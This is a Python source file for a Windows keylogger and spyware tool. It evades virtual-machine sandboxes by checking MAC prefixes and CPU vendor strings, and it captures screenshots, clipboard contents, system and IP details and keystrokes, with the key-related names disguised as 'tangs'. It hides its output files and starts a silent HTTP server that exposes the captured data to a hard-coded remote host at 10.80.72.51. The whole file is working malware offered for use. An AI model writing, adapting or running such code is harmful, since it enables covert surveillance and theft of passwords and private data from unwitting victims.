########################################
# IMPORTS
########################################
import os
import sys
import uuid
import psutil
import cpuinfo
import ctypes
import threading
import pathlib
import socketserver
import http.server
import requests
import subprocess

import time
import socket
import platform

import win32clipboard

from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

from pynput.keyboard import Key, Listener
########################################
# vm
########################################

def check_mac_address():
    mac_address = uuid.getnode()
    virtual_macs = ['00:0C:29', '00:50:56', '00:05:69', '00:1C:14', '00:1C:42', '00:0F:4B', '00:03:FF', '00:15:5D', '00:16:3E', '08:00:27']
    if any(hex(mac_address)[2:].startswith(mac) for mac in virtual_macs):
        return True
    return False

def check_vendor_string():
    info = cpuinfo.get_cpu_info()
    if 'vendor_id' not in info:
        return False
    vendor_string = info['vendor_id'].lower()
    virtual_env_names = ['kvm', 'virtualbox', 'vmware', 'hyperv', 'parallels', 'xen', 'qemu']
    for env_name in virtual_env_names:
        if env_name in vendor_string:
            return True
    return False

def check_virtualization():
    try:
        output = subprocess.check_output(['virt-what']).decode().strip()
        if output:
            return True
        else:
            return False
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def check_trusted_platform():
    return not check_mac_address() and not check_vendor_string() and not check_virtualization()

if not check_trusted_platform():
    print("This script must be run on a trusted platform.")
    sys.exit(1)
else:
    pass

########################################
# config
########################################

gom = 0x02
count = 0

# List to store the pressed tang
tangs = []
sys_info = "syseminfo.txt"
clip_inf = "clip_inf.txt"
screen = "screen.png"
dire = str(pathlib.Path().resolve())
fil = dire.replace('\\','\\\\')
extend = "\\"

########################################
# get_ip
########################################

remote_server_url = "http://10.80.72.51:8080/get-ip"

response = requests.get(remote_server_url)
ip_address = response.text.strip()
response.close()

########################################
# comp_info
########################################

def computer_information():
    with open(fil + extend + sys_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
        ret = ctypes.windll.kernel32.SetFileAttributesW(sys_info, gom)
        if not ret:
            raise ctypes.WinError()

########################################
# clip_info
########################################

def copy_clipboard():
    with open(fil + extend + clip_inf, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")
        ret = ctypes.windll.kernel32.SetFileAttributesW(clip_inf, gom)
        if not ret:
            raise ctypes.WinError()

########################################
# screen_info
########################################

def screenshot():
    im = ImageGrab.grab()
    im.save(fil + extend + screen)
time.sleep(3)


screenshot()
copy_clipboard()
computer_information()

########################################
# tang_info
########################################

def on_press(tang):
    global tangs, count

    tangs.append(tang)
    count += 1

    # If the number of presses reaches 10, write the tangs to file
    if count >= 10:
        count = 0
        write_file(tangs)
        tangs = []

# Callback function to handle tang release events
def on_release(tang):
    if tang == Key.esc:
        return False

# Write the pressed tangs to file
def write_file(tangs):
    # For *nix systems, add a '.' prefix to the file name
    prefix = '.' if os.name != 'nt' else ''
    file_name = prefix + 'tjo.txt'

    # Open the file in append mode and write the tangs
    with open(file_name, 'a') as file:
        for tang in tangs:
            tang = str(tang).replace("'","")
            # If the tang is space or enter, write a newline character
            if 'space' in tang or 'enter' in tang:
                file.write('\n')
            # If the tang is not recognized, write its value as is
            elif 'Key' not in tang:
                file.write(tang)

    # For Windows systems, set the file as hidden
    if os.name == 'nt':
        ret = ctypes.windll.kernel32.SetFileAttributesW(file_name, gom)
        if not ret:
            raise ctypes.WinError()

########################################
# ss
########################################

class MyHTTPHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory="./", **kwargs)

    def log_message(self, format, *args):
        pass

def r_s():
    # Get the IP address of the computer on the local network
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("10.80.72.51", 5000))
    ip_address = s.getsockname()[0]
    s.close()
    
    # Start the server
    server = socketserver.TCPServer((ip_address, 8000), MyHTTPHandler)
    server.quet = True
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

########################################
# start
########################################

# Start the tang listener in a separate thread
if __name__ == '__main__':
    freeze_support()
    # Start the tang listener in a separate thread
    thread = threading.Thread(target=r_s)
    thread.start()

with Listener(on_press=on_press, on_release=on_release) as listener:
   listener.join()
